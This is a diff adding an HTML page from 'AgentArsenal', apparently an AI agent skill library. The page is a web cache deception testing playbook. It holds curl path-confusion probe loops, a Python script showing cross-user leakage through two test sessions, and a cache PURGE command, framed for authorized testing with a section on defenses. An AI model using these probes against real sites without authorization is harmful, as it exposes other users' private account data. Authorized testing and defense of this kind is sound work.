@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: cache-deception</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>cache-deception</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing for web cache deception on an authorized</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="cache-poisoning.html">cache-poisoning</a> <a href="header-injection.html">header-injection</a> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>curl</td><td>8.11</td></tr></tbody></table><p>Web cache deception tricks the cache into storing one user&#x27;s private page under a public URL, so the next visitor gets someone else&#x27;s account details. This skill covers authorized testing: finding cache key confusion, proving the cache stores authenticated content, and demonstrating the leak with test accounts only. Use canary markers, purge after testing, and never target real user sessions.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Map the caching layer: headers that reveal it (Age, X-Cache, CF</li>
+<p>cache status) and its behavior.</p>
+<li>Learn the cache key: which parts of the request (path, query,</li>
+<p>headers) decide hits.</p>
+<li>Try path confusion: append a static extension to an authenticated</li>
+<p>path (/account/secret.css).</p>
+<li>Check the response: does the cache store it, and under what key.</li>
+<li>Prove cross user impact with two test accounts: victim caches,</li>
+<p>attacker retrieves.</p>
+<li>Test cache busting resistance: can the attacker force the victim&#x27;s</li>
+<p>URL to be cached.</p>
+<li>Purge every poisoned entry you created.</li>
+<li>Recommend the fixes: cache key normalization and no-cache on</li>
+<p>authenticated content.</p>
+</ol>
+<h2>1. Cache mapping</h2>
+<pre><code class="language-bash"># Identify the cache and its key behavior
+curl -s -i &#x27;https://target.example/static/app.css&#x27; | grep -i -E &quot;^(age|x-cache|cf-cache-status|via):&quot; | head
+# Repeat a request and watch Age grow: cached. Age missing: not cached.
+for i in 1 2 3; do
+  curl -s -i &#x27;https://target.example/account&#x27; -H &quot;Cookie: session=$VICTIM&quot; \
+    | grep -i -E &quot;^(age|x-cache):&quot; | tr &#x27;\n&#x27; &#x27; &#x27;; echo
+  sleep 1
+done</code></pre>
+<pre><code class="language-bash"># Path confusion probes: authenticated path + static looking suffix
+for p in &quot;/account/x.css&quot; &quot;/account/x.js&quot; &quot;/account%2fx.css&quot; \
+         &quot;/account;/x.css&quot; &quot;/account/.css&quot;; do
+  echo &quot;=== $p&quot;
+  curl -s -i &quot;https://target.example$p&quot; -H &quot;Cookie: session=$VICTIM&quot; \
+    | grep -i -E &quot;^(HTTP|age|x-cache|content-type):&quot; | head -5
+done
+# Cached (Age present or HIT) + private content = the vulnerability pattern</code></pre>
+<h2>2. Cross user proof (test accounts only)</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Cache deception proof with two test accounts (authorized target).&quot;&quot;&quot;
+import urllib.request
+
+BASE = &quot;https://target.example&quot;
+VICTIM = &quot;session=victim_test_session&quot;
+ATTACKER = &quot;session=attacker_test_session&quot;
+POISON_PATH = &quot;/account/secret.css&quot;  # path confusion candidate
+
+def get(path, cookie):
+    req = urllib.request.Request(BASE + path, headers={&quot;Cookie&quot;: cookie})
+    with urllib.request.urlopen(req, timeout=15) as r:
+        return r.status, dict(r.getheaders()), r.read()[:500]
+
+# Victim (logged in) requests the confusing path -&gt; may populate cache
+s1, h1, b1 = get(POISON_PATH, VICTIM)
+print(&quot;victim:&quot;, s1, &quot;cache:&quot;, h1.get(&quot;X-Cache&quot;), &quot;has canary:&quot;, b&quot;VICTIM_CANARY&quot; in b1)
+# Attacker (different session) requests the same path
+s2, h2, b2 = get(POISON_PATH, ATTACKER)
+print(&quot;attacker:&quot;, s2, &quot;cache:&quot;, h2.get(&quot;X-Cache&quot;), &quot;sees victim data:&quot;, b&quot;VICTIM_CANARY&quot; in b2)</code></pre>
+<pre><code class="language-bash"># PURGE after testing: remove every entry you poisoned
+curl -s -X PURGE &quot;https://target.example/account/secret.css&quot; | head -c 200
+# Or use the CDN purge API; confirm with a fresh request showing MISS</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>The cache keys on cookies. Then deception fails; verify the key</li>
+<p>includes the session cookie before moving on.</p>
+<li>The app sends Cache-Control: private but the CDN ignores it.</li>
+<p>Test the actual behavior, not the headers.</p>
+<li>Path confusion blocked by the WAF. Try encoded variants, but one</li>
+<p>round is enough; do not fight the WAF all day.</p>
+<li>The &quot;private&quot; content is actually public. Confirm the page really</li>
+<p>contains per user data before claiming impact.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Deception works but purging is unavailable: limit testing to a</li>
+<p>single canary URL and coordinate purge with the client.</p>
+<li>The cache is shared across tenants: the impact is worse; prove</li>
+<p>with test tenants on each side.</p>
+<li>No cache at all: this skill does not apply; check the CDN config</li>
+<p>anyway for the report.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see cache deception as requests for odd paths (account pages with .css suffixes), cache HITs on authenticated URLs, and poisoned entries served to multiple users. Detect with alerts on authenticated content being cached and on cache key anomalies. The durable fix: normalize cache keys, never cache responses with Set-Cookie or private content, and honor Cache-Control from the origin.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-524 (Use of Cache Containing Sensitive Information).</li>
+<li>CWE-200 (Exposure of Sensitive Information).</li>
+<li>Web cache deception research (Black Hat presentations).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
